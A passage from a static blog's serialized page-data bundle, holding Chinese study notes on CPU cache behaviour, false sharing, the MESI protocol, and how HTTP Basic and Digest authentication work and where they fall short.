CPU 可以直接从 Cache读取到指令，于是执⾏速度就会很快。\n\n当数组中的元素是随机的，分⽀预测就⽆法有效⼯作，⽽当数组元素都是是顺序的，分⽀预测器会动态地根据历史命中数据对未来进⾏预测，这样命中率就会很⾼。\n\n因此，先排序再遍历速度会更快，这是因为排序之后，数字是从⼩到⼤的，那么前⼏次循环命中 if < 50的次数会⽐较多，于是分⽀预测就会缓存 if ⾥的 array[i] = 0 指令到 Cache 中，后续 CPU 执⾏该指令就只需要从 Cache 读取就好了。",normalizedContent:"两种循环方式\n\n\n# 提升数据缓存命中率\n\n形式⼀ array[i][j] 执⾏时间⽐形式⼆ array[j][i] 快好⼏倍。\n\n之所以有这么⼤的差距，是因为⼆维数组 array 所占⽤的内存是连续的\n\ncpu 具体会⼀次从内存中加载多少元素到 cpu cache 呢？ 这个问题，在前⾯我们也提到过，这跟 cpu cache line 有关，它表示 cpu cache ⼀次性能加载数据的⼤⼩，可以在linux ⾥通过 coherency_line_size 配置查看 它的⼤⼩，通常是 64 个字节。\n\n\n\n按照内存布局顺序访问，将可以有效的利⽤ cpu cache 带来的好 处，这样我们代码的性能就会得到很⼤的提升\n\n\n# 提升指令缓存命中率\n\n以⼀个例⼦来看看，有⼀个元素为 0 到 100 之间随机数字组成的⼀维数组： 接下来，对这个数组做两个操作：\n\n * 第⼀个操作，循环遍历数组，把⼩于 50 的数组元素置为 0；\n * 第⼆个操作，将数组排序；\n\n那么问题来了，先遍历再排序速度快，还是先排序再遍历速度快呢？\n\ncpu 的分⽀预测器： 对于 if 条件语句，意味着此时⾄少可以选择跳转到两段不同的指令执⾏，也就是 if 还是 else 中的指令。 那么， 如果分⽀预测可以预测到接下来要执⾏ if ⾥的指令，还是 else 指令的话，就可以「提前」把这些指令放在指令缓存中，这样 cpu 可以直接从 cache读取到指令，于是执⾏速度就会很快。\n\n当数组中的元素是随机的，分⽀预测就⽆法有效⼯作，⽽当数组元素都是是顺序的，分⽀预测器会动态地根据历史命中数据对未来进⾏预测，这样命中率就会很⾼。\n\n因此，先排序再遍历速度会更快，这是因为排序之后，数字是从⼩到⼤的，那么前⼏次循环命中 if < 50的次数会⽐较多，于是分⽀预测就会缓存 if ⾥的 array[i] = 0 指令到 cache 中，后续 cpu 执⾏该指令就只需要从 cache 读取就好了。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"直接映射 Cache ：cache存取过程",frontmatter:{title:"直接映射 Cache ：cache存取过程",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/850ee7/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/05.%E7%9B%B4%E6%8E%A5%E6%98%A0%E5%B0%84%20Cache%20%EF%BC%9Acache%E5%AD%98%E5%8F%96%E8%BF%87%E7%A8%8B.html",relativePath:"05.操作系统/05.直接映射 Cache ：cache存取过程.md",key:"v-3275f8a0",path:"/pages/850ee7/",headersStr:null,content:"CPU Cache 的数据是从内存中读取过来的，它是以⼀⼩块⼀⼩块读取数据的，⽽不是按照单个数组元素来读取数据的，在 CPU Cache 中的，这样⼀⼩块⼀⼩块的数据，称为 Cache Line（缓存块） 。\n\n> Example：\n> \n>  * 内存共被划分为 32 个内存块\n>  * CPU Cache 共有 8 个 CPU Line， 假设 CPU 想要访问第 15 号内存块，如果 15 号内存块中的数据已经缓存在 CPU Line 中的话，则是⼀定映射在 7 号 CPU Line 中，因为 15 % 8 的值是 7。\n\n使用取模⽅式映射的话，就会出现多个内存块对应同⼀个 CPU Line，⽐如上面的例⼦，除了 15 号内存块是映射在 7 号 CPU Line 中，还有 7 号、 23 号、 31 号内存块都是映射到 7 号 CPULine 中\n\n为了区别不同的内存块，在对应的 CPU Line 中我们还会存储⼀个组标记（Tag） 。这个组标记会记录当前 CPU Line 中存储的数据对应的内存块，我们可以⽤这个组标记来区分不同的内存块。\n\n除了组标记信息外， CPU Line 还有两个信息：\n\n * 从内存加载过来的实际存放数据（Data） 。\n * 有效位（Valid bit） ，它是⽤来标记对应的 CPU Line 中的数据是否是有效的，如果有效位是 0，⽆论 CPU Line 中是否有数据， CPU 都会直接访问内存，重新加载数据。\n\nCPU 在从 CPU Cache 读取数据的时候，并不是读取 CPU Line 中的整个数据块，⽽是读取 CPU 所需要的⼀个数据⽚段，这样的数据统称为⼀个字（Word） 。那怎么在对应的 CPU Line 中数据块中找到所需的字呢？答案是，需要⼀个偏移量（Offset） 。\n\n\n\n⼀个内存的访问地址，包括组标记、 CPU Line 索引、偏移量这三种信息，于是 CPU 就能通过这些信息，在 CPU Cache 中找到缓存的数据。 CPU Cache ⾥的数据结构，则是由索引 + 有效位 + 组标记 + 数据块组成。\n\n如果内存中的数据已经在 CPU Cahe 中了，那 CPU 访问⼀个内存地址的时候，会经历这 4 个步骤：\n\n 1. 根据内存地址中索引信息，计算在 CPU Cahe 中的索引，也就是找出对应的 CPU Line 的地址；\n 2. 找到对应 CPU Line 后，判断 CPU Line 中的有效位，确认 CPU Line 中数据是否是有效的，如果是⽆效的， CPU 就会直接访问内存，并重新加载数据，如果数据有效，则往下执⾏；\n 3. 对⽐内存地址中组标记和 CPU Line 中的组标记，确认 CPU Line 中的数据是我们要访问的内存数据，如果不是的话， CPU 就会直接访问内存，并重新加载数据，如果是的话，则往下执⾏；\n 4. 根据内存地址中偏移量信息，从 CPU Line 的数据块中，读取对应的字。",normalizedContent:"cpu cache 的数据是从内存中读取过来的，它是以⼀⼩块⼀⼩块读取数据的，⽽不是按照单个数组元素来读取数据的，在 cpu cache 中的，这样⼀⼩块⼀⼩块的数据，称为 cache line（缓存块） 。\n\n> example：\n> \n>  * 内存共被划分为 32 个内存块\n>  * cpu cache 共有 8 个 cpu line， 假设 cpu 想要访问第 15 号内存块，如果 15 号内存块中的数据已经缓存在 cpu line 中的话，则是⼀定映射在 7 号 cpu line 中，因为 15 % 8 的值是 7。\n\n使用取模⽅式映射的话，就会出现多个内存块对应同⼀个 cpu line，⽐如上面的例⼦，除了 15 号内存块是映射在 7 号 cpu line 中，还有 7 号、 23 号、 31 号内存块都是映射到 7 号 cpuline 中\n\n为了区别不同的内存块，在对应的 cpu line 中我们还会存储⼀个组标记（tag） 。这个组标记会记录当前 cpu line 中存储的数据对应的内存块，我们可以⽤这个组标记来区分不同的内存块。\n\n除了组标记信息外， cpu line 还有两个信息：\n\n * 从内存加载过来的实际存放数据（data） 。\n * 有效位（valid bit） ，它是⽤来标记对应的 cpu line 中的数据是否是有效的，如果有效位是 0，⽆论 cpu line 中是否有数据， cpu 都会直接访问内存，重新加载数据。\n\ncpu 在从 cpu cache 读取数据的时候，并不是读取 cpu line 中的整个数据块，⽽是读取 cpu 所需要的⼀个数据⽚段，这样的数据统称为⼀个字（word） 。那怎么在对应的 cpu line 中数据块中找到所需的字呢？答案是，需要⼀个偏移量（offset） 。\n\n\n\n⼀个内存的访问地址，包括组标记、 cpu line 索引、偏移量这三种信息，于是 cpu 就能通过这些信息，在 cpu cache 中找到缓存的数据。 cpu cache ⾥的数据结构，则是由索引 + 有效位 + 组标记 + 数据块组成。\n\n如果内存中的数据已经在 cpu cahe 中了，那 cpu 访问⼀个内存地址的时候，会经历这 4 个步骤：\n\n 1. 根据内存地址中索引信息，计算在 cpu cahe 中的索引，也就是找出对应的 cpu line 的地址；\n 2. 找到对应 cpu line 后，判断 cpu line 中的有效位，确认 cpu line 中数据是否是有效的，如果是⽆效的， cpu 就会直接访问内存，并重新加载数据，如果数据有效，则往下执⾏；\n 3. 对⽐内存地址中组标记和 cpu line 中的组标记，确认 cpu line 中的数据是我们要访问的内存数据，如果不是的话， cpu 就会直接访问内存，并重新加载数据，如果是的话，则往下执⾏；\n 4. 根据内存地址中偏移量信息，从 cpu line 的数据块中，读取对应的字。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"Cache 伪共享",frontmatter:{title:"Cache 伪共享",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/5ed5ed/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/06.Cache%20%E4%BC%AA%E5%85%B1%E4%BA%AB.html",relativePath:"05.操作系统/06.Cache 伪共享.md",key:"v-190634da",path:"/pages/5ed5ed/",headersStr:null,content:"# 什么是伪共享\n\n现在假设有⼀个双核⼼的 CPU，这两个 CPU 核⼼并⾏运⾏着两个不同的线程，它们同时从内存中读取两个不同的数据，分别是类型为 long 的变量 A 和 B，这个两个数据的地址在物理内存上是连续的，如果Cahce Line 的⼤⼩是 64 字节，并且变量 A 在 Cahce Line 的开头位置，那么这两个数据是位于同⼀个Cache Line 中，⼜因为 CPU Line 是 CPU 从内存读取数据到 Cache 的单位，所以这两个数据会被同时读⼊到了两个 CPU 核⼼中各⾃ Cache 中。\n\n核心1 只对A 持续的修改， 核心2 只对B 持续的修改 但由于他们只属于同一个Cache line 他们明明处理的内容不同 但是缓存了同一块区域 为了保持数据一致性，CPU 两个不同的核心会疯狂的内存和缓存之间换进换出 没有起到缓存的作用\n\n这种因为多个线程同时读写同⼀个 Cache Line 的不同变量时，⽽导致 CPU Cache 失效的现象称为伪共享（False Sharing） 。\n\n\n# 避免伪共享的方法\n\nLinux 内核中存在 __cacheline_aligned_in_smp 宏定义，是⽤于解决伪共享的问题 有下⾯这个结构体\n\nstruct test{\n\tint a;\n\tint b;\n}\n\n\n1\n2\n3\n4\n\n\n结构体⾥的两个成员变量 a 和 b 在物理内存地址上是连续的，于是它们可能会位于同⼀个 Cache Line中，如下图： 为了防⽌前⾯提到的 Cache 伪共享问题，我们可以使⽤上⾯介绍的宏定义，将 b 的地址设置为Cache Line 对⻬地址，如下\n\nstruct test{\n\tint a;\n\tint b __cacheline_aligned_in_smp;\n}\n\n\n1\n2\n3\n4\n\n\n这样 a 和 b 变量就不会在同⼀个 Cache Line 中了，如下图：\n\n有⼀个 Java 并发框架 Disruptor 使⽤「字节填充 + 继承」的⽅式，来避免伪共享的问题。\n\n我们都知道， CPU Cache 从内存读取数据的单位是 CPU Line，⼀般 64 位 CPU 的 CPU Line 的⼤⼩是 64个字节，⼀个 long 类型的数据是 8 个字节，所以 CPU ⼀下会加载 8 个 long 类型的数据。\n\nJVM 对象继承关系中⽗类成员和⼦类成员，内存地址是连续排列布局的，因此 RingBufferPad 中的 7 个 long 类型数据作为 Cache Line 前置填充，⽽ RingBuffer 中的 7 个 long 类型数据则作为 Cache Line 后 置填充，这 14 个 long 变量没有任何实际⽤途，更不会对它们进⾏读写操作。",normalizedContent:"# 什么是伪共享\n\n现在假设有⼀个双核⼼的 cpu，这两个 cpu 核⼼并⾏运⾏着两个不同的线程，它们同时从内存中读取两个不同的数据，分别是类型为 long 的变量 a 和 b，这个两个数据的地址在物理内存上是连续的，如果cahce line 的⼤⼩是 64 字节，并且变量 a 在 cahce line 的开头位置，那么这两个数据是位于同⼀个cache line 中，⼜因为 cpu line 是 cpu 从内存读取数据到 cache 的单位，所以这两个数据会被同时读⼊到了两个 cpu 核⼼中各⾃ cache 中。\n\n核心1 只对a 持续的修改， 核心2 只对b 持续的修改 但由于他们只属于同一个cache line 他们明明处理的内容不同 但是缓存了同一块区域 为了保持数据一致性，cpu 两个不同的核心会疯狂的内存和缓存之间换进换出 没有起到缓存的作用\n\n这种因为多个线程同时读写同⼀个 cache line 的不同变量时，⽽导致 cpu cache 失效的现象称为伪共享（false sharing） 。\n\n\n# 避免伪共享的方法\n\nlinux 内核中存在 __cacheline_aligned_in_smp 宏定义，是⽤于解决伪共享的问题 有下⾯这个结构体\n\nstruct test{\n\tint a;\n\tint b;\n}\n\n\n1\n2\n3\n4\n\n\n结构体⾥的两个成员变量 a 和 b 在物理内存地址上是连续的，于是它们可能会位于同⼀个 cache line中，如下图： 为了防⽌前⾯提到的 cache 伪共享问题，我们可以使⽤上⾯介绍的宏定义，将 b 的地址设置为cache line 对⻬地址，如下\n\nstruct test{\n\tint a;\n\tint b __cacheline_aligned_in_smp;\n}\n\n\n1\n2\n3\n4\n\n\n这样 a 和 b 变量就不会在同⼀个 cache line 中了，如下图：\n\n有⼀个 java 并发框架 disruptor 使⽤「字节填充 + 继承」的⽅式，来避免伪共享的问题。\n\n我们都知道， cpu cache 从内存读取数据的单位是 cpu line，⼀般 64 位 cpu 的 cpu line 的⼤⼩是 64个字节，⼀个 long 类型的数据是 8 个字节，所以 cpu ⼀下会加载 8 个 long 类型的数据。\n\njvm 对象继承关系中⽗类成员和⼦类成员，内存地址是连续排列布局的，因此 ringbufferpad 中的 7 个 long 类型数据作为 cache line 前置填充，⽽ ringbuffer 中的 7 个 long 类型数据则作为 cache line 后 置填充，这 14 个 long 变量没有任何实际⽤途，更不会对它们进⾏读写操作。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"MESI（缓存一致性协议）",frontmatter:{title:"MESI（缓存一致性协议）",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/941cba/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/07.MESI%EF%BC%88%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E5%8D%8F%E8%AE%AE%EF%BC%89.html",relativePath:"05.操作系统/07.MESI（缓存一致性协议）.md",key:"v-4c01e178",path:"/pages/941cba/",headers:[{level:2,title:"嗅探的缺点",slug:"嗅探的缺点",normalizedTitle:"嗅探的缺点",charIndex:980}],headersStr:"嗅探的缺点",content:"当CPU写数据时，如果发现操作的变量是共享变量，即在其他CPU中也存在该变量的副本，会发出信号通知其他CPU将该变量的缓存行置为无效状态，因此当其他CPU需要读取这个变量时，发现自己缓存中缓存该变量的缓存行是无效的，那么它就会从内存重新读取。\n\n\n# 至于是怎么发现数据是否失效呢？\n\n嗅探 每个处理器通过嗅探在总线上传播的数据来检查自己缓存的值是不是过期了，当处理器发现自己缓存行对应的内存地址被修改，就会将当前处理器的缓存行设置成无效状态，当处理器对这个数据进行修改操作的时候，会重新从系统内存中把数据读到处理器缓存里。\n\n\n# 原理\n\nMESI 协议其实是 4 个状态单词的开头字⺟缩写，分别是：\n\n * Modified，已修改\n * Exclusive，独占\n * Shared，共享\n * Invalidated，已失效 这四个状态来标记 Cache Line 四个不同的状态。\n\n「已修改」状态就是我们前⾯提到的脏标记，代表该 Cache Block 上的数据已经被更新过，但是还没有写到内存⾥。\n\n「已失效」状态，表示的是这个 Cache Block ⾥的数据已经失效了，不可以读取该状态的数 据。\n\n「独占」和「共享」状态都代表 Cache Block ⾥的数据是⼲净的，也就是说，这个时候 Cache Block ⾥的数据和内存⾥⾯的数据是⼀致性的。\n\n「独占」和「共享」的差别在于，独占状态的时候，数据只存储在⼀个 CPU 核⼼的 Cache ⾥，⽽其他CPU 核⼼的 Cache 没有该数据。这个时候，如果要向独占的 Cache 写数据，就可以直接⾃由地写⼊，⽽不需要通知其他 CPU 核⼼，因为只有你这有这个数据，就不存在缓存⼀致性的问题了，于是就可以随便操作该数据。\n\n另外，在「独占」状态下的数据，如果有其他核⼼从内存读取了相同的数据到各⾃的 Cache ，那么这个时候，独占状态下的数据就会变成共享状态。\n\n那么，「共享」状态代表着相同的数据在多个 CPU 核⼼的 Cache ⾥都有，所以当我们要更新 Cache ⾥⾯的数据的时候，不能直接修改，⽽是要先向所有的其他 CPU 核⼼⼴播⼀个请求，要求先把其他核⼼的Cache 中对应的 Cache Line 标记为「⽆效」状态，然后再更新当前 Cache ⾥⾯的数据。\n\n\n# 嗅探的缺点\n\n总线风暴：由于Volatile的MESI缓存一致性协议，需要不断的从主内存嗅探和cas不断循环，无效交互会导致总线带宽达到峰值。",normalizedContent:"当cpu写数据时，如果发现操作的变量是共享变量，即在其他cpu中也存在该变量的副本，会发出信号通知其他cpu将该变量的缓存行置为无效状态，因此当其他cpu需要读取这个变量时，发现自己缓存中缓存该变量的缓存行是无效的，那么它就会从内存重新读取。\n\n\n# 至于是怎么发现数据是否失效呢？\n\n嗅探 每个处理器通过嗅探在总线上传播的数据来检查自己缓存的值是不是过期了，当处理器发现自己缓存行对应的内存地址被修改，就会将当前处理器的缓存行设置成无效状态，当处理器对这个数据进行修改操作的时候，会重新从系统内存中把数据读到处理器缓存里。\n\n\n# 原理\n\nmesi 协议其实是 4 个状态单词的开头字⺟缩写，分别是：\n\n * modified，已修改\n * exclusive，独占\n * shared，共享\n * invalidated，已失效 这四个状态来标记 cache line 四个不同的状态。\n\n「已修改」状态就是我们前⾯提到的脏标记，代表该 cache block 上的数据已经被更新过，但是还没有写到内存⾥。\n\n「已失效」状态，表示的是这个 cache block ⾥的数据已经失效了，不可以读取该状态的数 据。\n\n「独占」和「共享」状态都代表 cache block ⾥的数据是⼲净的，也就是说，这个时候 cache block ⾥的数据和内存⾥⾯的数据是⼀致性的。\n\n「独占」和「共享」的差别在于，独占状态的时候，数据只存储在⼀个 cpu 核⼼的 cache ⾥，⽽其他cpu 核⼼的 cache 没有该数据。这个时候，如果要向独占的 cache 写数据，就可以直接⾃由地写⼊，⽽不需要通知其他 cpu 核⼼，因为只有你这有这个数据，就不存在缓存⼀致性的问题了，于是就可以随便操作该数据。\n\n另外，在「独占」状态下的数据，如果有其他核⼼从内存读取了相同的数据到各⾃的 cache ，那么这个时候，独占状态下的数据就会变成共享状态。\n\n那么，「共享」状态代表着相同的数据在多个 cpu 核⼼的 cache ⾥都有，所以当我们要更新 cache ⾥⾯的数据的时候，不能直接修改，⽽是要先向所有的其他 cpu 核⼼⼴播⼀个请求，要求先把其他核⼼的cache 中对应的 cache line 标记为「⽆效」状态，然后再更新当前 cache ⾥⾯的数据。\n\n\n# 嗅探的缺点\n\n总线风暴：由于volatile的mesi缓存一致性协议，需要不断的从主内存嗅探和cas不断循环，无效交互会导致总线带宽达到峰值。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"目录",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"05.操作系统",imgUrl:"/img/catalog.png",description:"操作系统"}},title:"目录",date:"2022-04-17T21:48:12.000Z",permalink:"/system/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/catalog.html",relativePath:"05.操作系统/catalog.md",key:"v-9e12bdf4",path:"/system/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"http auth认证 basic认证",frontmatter:{title:"http auth认证 basic认证",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/d113b5/",categories:["网络","网络协议","http_https"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/01.%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/01.http(s)/01.http%20auth%E8%AE%A4%E8%AF%81%20basic%E8%AE%A4%E8%AF%81.html",relativePath:"06.网络/01.网络协议/01.http(s)/01.http auth认证 basic认证.md",key:"v-0c5b7b3e",path:"/pages/d113b5/",headersStr:null,content:'# 一、概述\n\n> Basic认证是一种较为简单的HTTP认证方式，客户端通过明文（Base64编码格式）传输用户名和密码到服务端进行认证，通常需要配合HTTPS来保证信息传输的安全。\n\n\n\n\n# 二、剖析\n\n1.当打开需要认证的页面时，会弹出一个对话框，要求输入用户名和密码\n\n\n\n2.使用Fiddler监听请求，可以看到在未进行认证或认证失败的情况下，服务端会返回401 Unauthorized给客户端，并附带Challenge（质询），即在Response Header中添加WWW-Authenticate标头，浏览器识别到Basic后弹出对话框 Realm表示Web服务器中受保护文档的安全域（比如公司财务信息域和公司员工信息域），用来指示需要哪个域的用户名和密码，用" "包括起来（截图中没有，但最好加上）。\n\n\n\n3.输入正确的用户名和密码，认证成功后，浏览器会将凭据信息缓存起来，那么以后再进入时，无需重复手动输入用户名和密码。 查看HTTP请求，可以看到Request Header中添加了Authorization标头，格式为：Authorization: <type> <credentials>\n\n * 类型为“Basic”\n * 凭证为“MTIzOjEyMw==”，是通过将“用户名:密码”格式的字符串经过的Base64编码得到的。而Base64不属于加密范畴，可以被逆向解码，等同于明文，因此Basic传输认证信息是不安全的\n\n\n\n\n# 三、缺陷\n\n1.用户名和密码明文（Base64）传输，需要配合HTTPS来保证信息传输的安全。 2.即使密码被强加密，第三方仍可通过加密后的用户名和密码进行重放攻击。 3.没有提供任何针对代理和中间节点的防护措施。 4.假冒服务器很容易骗过认证，诱导用户输入用户名和密码。 接下来，我会带大家一起去了解更为安全的摘要认证——Digest。',normalizedContent:'# 一、概述\n\n> basic认证是一种较为简单的http认证方式，客户端通过明文（base64编码格式）传输用户名和密码到服务端进行认证，通常需要配合https来保证信息传输的安全。\n\n\n\n\n# 二、剖析\n\n1.当打开需要认证的页面时，会弹出一个对话框，要求输入用户名和密码\n\n\n\n2.使用fiddler监听请求，可以看到在未进行认证或认证失败的情况下，服务端会返回401 unauthorized给客户端，并附带challenge（质询），即在response header中添加www-authenticate标头，浏览器识别到basic后弹出对话框 realm表示web服务器中受保护文档的安全域（比如公司财务信息域和公司员工信息域），用来指示需要哪个域的用户名和密码，用" "包括起来（截图中没有，但最好加上）。\n\n\n\n3.输入正确的用户名和密码，认证成功后，浏览器会将凭据信息缓存起来，那么以后再进入时，无需重复手动输入用户名和密码。 查看http请求，可以看到request header中添加了authorization标头，格式为：authorization: <type> <credentials>\n\n * 类型为“basic”\n * 凭证为“mtizojeymw==”，是通过将“用户名:密码”格式的字符串经过的base64编码得到的。而base64不属于加密范畴，可以被逆向解码，等同于明文，因此basic传输认证信息是不安全的\n\n\n\n\n# 三、缺陷\n\n1.用户名和密码明文（base64）传输，需要配合https来保证信息传输的安全。 2.即使密码被强加密，第三方仍可通过加密后的用户名和密码进行重放攻击。 3.没有提供任何针对代理和中间节点的防护措施。 4.假冒服务器很容易骗过认证，诱导用户输入用户名和密码。 接下来，我会带大家一起去了解更为安全的摘要认证——digest。',charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"http auth认证 digest认证 摘要认证",frontmatter:{title:"http auth认证 digest认证 摘要认证",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/a1062f/",categories:["网络","网络协议","http_https"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/01.%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/01.http(s)/02.http%20auth%E8%AE%A4%E8%AF%81%20digest%E8%AE%A4%E8%AF%81%20%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81.html",relativePath:"06.网络/01.网络协议/01.http(s)/02.http auth认证 digest认证 摘要认证.md",key:"v-bd60e0a0",path:"/pages/a1062f/",headersStr:null,content:'# 一、概述\n\n> Digest认证是为了修复基本认证协议的严重缺陷而设计的，秉承“绝不通过明文在网络发送密码”的原则，通过“密码摘要”进行认证，大大提高了安全性。\n\n相对于基本认证，主要有如下改进：\n\n * 绝不通过明文在网络上发送密码\n * 可以有效防止恶意用户进行重放攻击\n * 可以有选择的防止对报文内容的篡改\n\n需要注意的是，摘要认证除了能够保护密码之外，并不能保护其他内容，与HTTPS配合使用仍是一个良好的选择。以下是摘要认证的具体流程图：\n\n\n\n看到上面出现了那么多之前没见过的参数，是不是有点慌（或是兴奋）？别着急，这里先给出一个概览：\n\n * WWW-Authentication：用来定义使用何种方式（Basic、Digest、Bearer等）去进行认证以获取受保护的资源\n * realm：表示Web服务器中受保护文档的安全域（比如公司财务信息域和公司员工信息域），用来指示需要哪个域的用户名和密码\n * qop：保护质量，包含auth（默认的）和auth-int（增加了报文完整性检测）两种策略，（可以为空，但是）不推荐为空值\n * nonce：服务端向客户端发送质询时附带的一个随机数，这个数会经常发生变化。客户端计算密码摘要时将其附加上去，使得多次生成同一用户的密码摘要各不相同，用来防止重放攻击\n * nc：nonce计数器，是一个16进制的数值，表示同一nonce下客户端发送出请求的数量。例如，在响应的第一个请求中，客户端将发送“nc=00000001”。这个指示值的目的是让服务器保持这个计数器的一个副本，以便检测重复的请求\n * cnonce：客户端随机数，这是一个不透明的字符串值，由客户端提供，并且客户端和服务器都会使用，以避免用明文文本。这使得双方都可以查验对方的身份，并对消息的完整性提供一些保护\n * response：这是由用户代理软件计算出的一个字符串，以证明用户知道口令\n * Authorization-Info：用于返回一些与授权会话相关的附加信息\n * nextnonce：下一个服务端随机数，使客户端可以预先发送正确的摘要\n * rspauth：响应摘要，用于客户端对服务端进行认证\n * stale：当密码摘要使用的随机数过期时，服务器可以返回一个附带有新随机数的401响应，并指定stale=true，表示服务器在告知客户端用新的随机数来重试，而不再要求用户重新输入用户名和密码了\n\n\n# 二、剖析\n\n1.当打开需要认证的页面时，会弹出一个对话框，要求用户输入用户名和密码\n\n\n\n2.使用Fidder监听请求，可以看到在未进行认证或认证失败的情况下，服务端会返回401 Unauthorized给客户端，并附带Challenge\n\n\n\n3.输入正确的用户名和密码后，浏览器会生成密码摘要以及其他信息发送给服务端，服务端认证成功后，返回一些与授权会话相关的附加信息，放在Authorization-Info中。\n\n其中，客户端选择的保护质量策略为auth，response就是通过计算得到的密码摘要，具体计算方式如下（使用默认的MD5加密算法）：MD5(MD5(A1):<nonce>:<nc>:<cnonce>:<qop>:MD5(A2))\n\n算法         A1\nMD5（默认）    <username>:<realm>:<password>\nMD5-sess   MD5(<username>:<realm>:<password>):<nonce>:<cnonce>\n\nQOP        A2\nauth（默认）   <request-method>:<uri>\nauth-int   <request-method>:<uri>:MD5(<request-entity-body>)\n\n另外，rspauth使得客户端可以对服务器进行认证，称为响应摘要。响应摘要的计算与请求摘要类似，但由于响应中没有方法，而且报文实体数据有所不同，所有只有报文主题信息A2不同。具体区别如下：\n\nQOP        A2\nauth（默认）   :<uri>\nauth-int   :<uri>:MD5(<response-entity-body>)\n\n\n\n4.当服务端随机数过期时，再次请求认证，可以看到质询中增加了stale=true，用户无需再次输入用户名和密码，浏览器会自动使用新的质询参数进行密码摘要的计算。\n\n\n\n\n# 三、注意事项\n\n1.预授权：服务端预先告知客户端下一个随机数是多少，使得客户端可以直接生成正确的Authorization首部，避免了多次“请求/质询”。常用的有一下三种方式：\n\n * 服务器预先在Authorization-Info成功首部中发送下一个随机数nextnonce。虽然这种机制加快了事务处理的速度，但是它也破坏了对同一台服务器的多次请求进行管道化的功能，可能会造成很大的损失。\n * 服务器允许在一小段时间内使用同一个随机数。这也就是我们上面剖析中使用的机制，在一定时间内使用同一个随机数或限制某个随机数的重用次数，当过期时，声明stale=true。虽然这确实降低了安全性，但是重用的随机数的生存周期是可控的，应该在安全和性能之间找到平衡。\n * 客户端和服务器使用同步的、可预测的随机数生成算法。\n\n2.RFC 2617建议采用这个假想的随机数公式：BASE64(timestamp MD5(timestamp ":" ETag ":" private-key)) 其中，timestamp是服务器产生随机数的时间或其他不重复的值，ETag是与所请求实体有关的HTTP ETag首部的值，private-key是只有服务器知道的私钥。',normalizedContent:'# 一、概述\n\n> digest认证是为了修复基本认证协议的严重缺陷而设计的，秉承“绝不通过明文在网络发送密码”的原则，通过“密码摘要”进行认证，大大提高了安全性。\n\n相对于基本认证，主要有如下改进：\n\n * 绝不通过明文在网络上发送密码\n * 可以有效防止恶意用户进行重放攻击\n * 可以有选择的防止对报文内容的篡改\n\n需要注意的是，摘要认证除了能够保护密码之外，并不能保护其他内容，与https配合使用仍是一个良好的选择。以下是摘要认证的具体流程图：\n\n\n\n看到上面出现了那么多之前没见过的参数，是不是有点慌（或是兴奋）？别着急，这里先给出一个概览：\n\n * www-authentication：用来定义使用何种方式（basic、digest、bearer等）去进行认证以获取受保护的资源\n * realm：表示web服务器中受保护文档的安全域（比如公司财务信息域和公司员工信息域），用来指示需要哪个域的用户名和密码\n * qop：保护质量，包含auth（默认的）和auth-int（增加了报文完整性检测）两种策略，（可以为空，但是）不推荐为空值\n * nonce：服务端向客户端发送质询时附带的一个随机数，这个数会经常发生变化。客户端计算密码摘要时将其附加上去，使得多次生成同一用户的密码摘要各不相同，用来防止重放攻击\n * nc：nonce计数器，是一个16进制的数值，表示同一nonce下客户端发送出请求的数量。例如，在响应的第一个请求中，客户端将发送“nc=00000001”。这个指示值的目的是让服务器保持这个计数器的一个副本，以便检测重复的请求\n * cnonce：客户端随机数，这是一个不透明的字符串值，由客户端提供，并且客户端和服务器都会使用，以避免用明文文本。这使得双方都可以查验对方的身份，并对消息的完整性提供一些保护\n * response：这是由用户代理软件计算出的一个字符串，以证明用户知道口令\n * authorization-info：用于返回一些与授权会话相关的附加信息\n * nextnonce：下一个服务端随机数，使客户端可以预先发送正确的摘要\n * rspauth：响应摘要，用于客户端对服务端进行认证\n * stale：当密码摘要使用的随机数过期时，服务器可以返回一个附带有新随机数的401响应，并指定stale=true，表示服务器在告知客户端用新的随机数来重试，而不再要求用户重新输入用户名和密码了\n\n\n# 二、剖析\n\n1.当打开需要认证的页面时，会弹出一个对话框，要求用户输入用户名和密码\n\n\n\n2.使用fidder监听请求，可以看到在未进行认证或认证失败的情况下，服务端会返回401 